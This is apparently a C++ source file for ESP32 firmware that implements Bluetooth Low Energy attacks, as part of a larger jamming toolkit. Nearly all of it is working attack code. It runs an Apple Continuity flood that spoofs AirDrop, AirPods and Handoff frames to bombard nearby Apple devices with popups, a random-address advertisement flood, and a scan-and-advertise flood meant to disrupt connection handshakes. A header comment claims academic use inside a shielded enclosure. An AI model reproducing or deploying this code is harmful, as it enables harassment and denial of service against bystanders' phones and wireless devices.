// ble_attack.cpp
// BLE-layer attacks using the ESP32's built-in NimBLE radio.
// Intended for academic / authorised security research only.
// All tests must be performed inside a shielded (Faraday) enclosure.
//
// Targets:
//   - Apple BLE Continuity protocol flood (AirDrop, Handoff, Nearby, etc.)
//   - Generic BLE advertisement flood (random MACs, max advertising rate)
//   - BLE GATT/connection-channel data flood via advertisement payload stuffing
//
// Method: The NimBLE stack is configured to send raw HCI advertising commands
// at maximum rate.  Because the ESP32's BLE radio uses the same 2.4 GHz band
// (channels 37/38/39) as the nRF24 modules but is driven independently, these
// two radio paths can run simultaneously without conflict.

#include "ble_attack.h"

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

// Reusable NimBLE advertising instance (lazy-init).
static NimBLEAdvertising *s_adv = nullptr;

static bool s_bleInitialized = false;

/// Ensure NimBLEDevice is initialised exactly once.
static void ensureBLEInit()
{
  if ( s_bleInitialized )
    return;
  NimBLEDevice::init("");
  NimBLEDevice::setMTU(23);
  // Use maximum TX power for research purposes.
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  s_bleInitialized = true;
}

/// Build a raw manufacturer-specific payload that mimics the Apple Continuity
/// frame format.  The opcode selects which Continuity sub-type to spoof:
///   0x05 – AirDrop
///   0x07 – AirPods proximity
///   0x0A – Nearby Action (QuickStart / Device Setup)
///   0x0C – Handoff
///   0x10 – Nearby Info
static void buildApplePayload(NimBLEAdvertisementData &data, uint8_t opcode, uint32_t seed)
{
  // Apple OUI = 0x004C
  uint8_t mfr[24];
  mfr[0] = 0x4C;   // Apple OUI (little-endian)
  mfr[1] = 0x00;
  mfr[2] = opcode; // Continuity type
  uint8_t payloadLen = 16;
  mfr[3]             = payloadLen;

  // Fill payload bytes with pseudo-random data derived from seed so that
  // each advertisement looks like a different device / state.
  for ( int i = 0; i < (int)payloadLen && i < (int)(sizeof(mfr) - 4); i++ )
  {
    seed = seed * 1664525UL + 1013904223UL; // LCG
    mfr[4 + i] = (seed >> 16) & 0xFF;
  }

  std::string mfrStr(reinterpret_cast<char *>(mfr), 4 + payloadLen);
  data.setManufacturerData(mfrStr);
}

// ---------------------------------------------------------------------------
// Public attack functions
// ---------------------------------------------------------------------------

/// Apple BLE Continuity flood.
/// Rapidly cycles through all seven Continuity opcodes with randomised payloads
/// so that nearby Apple devices are bombarded with pairing / notification popups.
void apple_ble_flood()
{
  ensureBLEInit();

  s_adv = NimBLEDevice::getAdvertising();
  s_adv->stop();

  // Cycle through Apple Continuity opcodes.
  static const uint8_t opcodes[] = {0x05, 0x07, 0x09, 0x0A, 0x0C, 0x0F, 0x10};
  int                  opIdx     = 0;
  uint32_t             seed      = esp_random();

  // External stop flag from the jamHandler infrastructure.
  extern bool stopJam;

  while ( !stopJam )
  {
    updateJoystickButtons();

    NimBLEAdvertisementData advData;
    advData.setFlags(0x1A); // LE General Discoverable, BR/EDR not supported
    buildApplePayload(advData, opcodes[opIdx], seed);

    // Randomise the advertised name to increase uniqueness.
    seed          = seed * 1664525UL + 1013904223UL;
    char name[5]  = {0};
    name[0]       = 'A' + (seed & 0x0F);
    name[1]       = 'B' + ((seed >> 4) & 0x0F);
    name[2]       = '\0';
    advData.setName(name);

    s_adv->setAdvertisementData(advData);
    s_adv->setMinInterval(20);  // 20 × 0.625 ms = 12.5 ms — fastest BT-legal rate
    s_adv->setMaxInterval(20);

    s_adv->start(0); // advertise indefinitely (will be stopped on next iteration)
    delayMicroseconds(3000);
    s_adv->stop();

    opIdx = (opIdx + 1) % (sizeof(opcodes) / sizeof(opcodes[0]));
    seed += millis();
  }

  s_adv->stop();
  NimBLEDevice::deinit(true);
  s_bleInitialized = false;
  vTaskDelete(NULL);
}

/// Generic BLE advertisement flood with random MAC addresses and payloads.
/// Saturates BLE advertising channels 37/38/39 at the maximum legal rate.
void ble_adv_flood()
{
  ensureBLEInit();

  s_adv = NimBLEDevice::getAdvertising();
  s_adv->stop();

  uint32_t seed = esp_random();

  extern bool stopJam;

  while ( !stopJam )
  {
    updateJoystickButtons();

    seed = seed * 1664525UL + 1013904223UL;

    // Let NimBLE handle random address automatically
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

    NimBLEAdvertisementData advData;
    advData.setFlags(0x06);

    // Random manufacturer data payload (max 26 bytes).
    uint8_t mfrPayload[26];
    seed           = seed * 1664525UL + 1013904223UL;
    mfrPayload[0]  = (seed) & 0xFF;       // Random OUI byte 0
    mfrPayload[1]  = (seed >> 8) & 0xFF;  // Random OUI byte 1
    for ( int i = 2; i < 26; i++ )
    {
      seed         = seed * 1664525UL + 1013904223UL;
      mfrPayload[i] = (seed >> 16) & 0xFF;
    }
    advData.setManufacturerData(std::string(reinterpret_cast<char *>(mfrPayload), 26));

    s_adv->setAdvertisementData(advData);
    s_adv->setMinInterval(20);
    s_adv->setMaxInterval(20);

    s_adv->start(0);
    delayMicroseconds(2500);
    s_adv->stop();
  }

  s_adv->stop();
  NimBLEDevice::deinit(true);
  s_bleInitialized = false;
  vTaskDelete(NULL);
}

/// BLE scanner flood: puts the ESP32 in scanning mode while simultaneously
/// advertising on 37/38/39 so that BLE devices in range are continuously
/// solicited, disrupting connection-establishment handshakes.
void ble_scan_flood()
{
  ensureBLEInit();

  NimBLEScan *scanner = NimBLEDevice::getScan();
  scanner->setActiveScan(true);
  scanner->setInterval(40);
  scanner->setWindow(40); // scan window == interval → 100 % duty cycle

  s_adv = NimBLEDevice::getAdvertising();
  s_adv->stop();

  uint32_t seed = esp_random();

  extern bool stopJam;

  while ( !stopJam )
  {
    updateJoystickButtons();

    // Start a short scan burst.
    scanner->start(0, false); // non-blocking

    // Simultaneously advertise with random payload.
    seed = seed * 1664525UL + 1013904223UL;
    NimBLEAdvertisementData advData;
    advData.setFlags(0x1A);
    uint8_t mfr[8];
    for ( int i = 0; i < 8; i++ )
    {
      seed   = seed * 1664525UL + 1013904223UL;
      mfr[i]  = (seed >> 16) & 0xFF;
    }
    advData.setManufacturerData(std::string(reinterpret_cast<char *>(mfr), 8));
    s_adv->setAdvertisementData(advData);
    s_adv->setMinInterval(20);
    s_adv->setMaxInterval(20);
    s_adv->start(0);

    delay(30);
    s_adv->stop();
    scanner->stop();
  }

  s_adv->stop();
  scanner->stop();
  NimBLEDevice::deinit(true);
  s_bleInitialized = false;
  vTaskDelete(NULL);
}
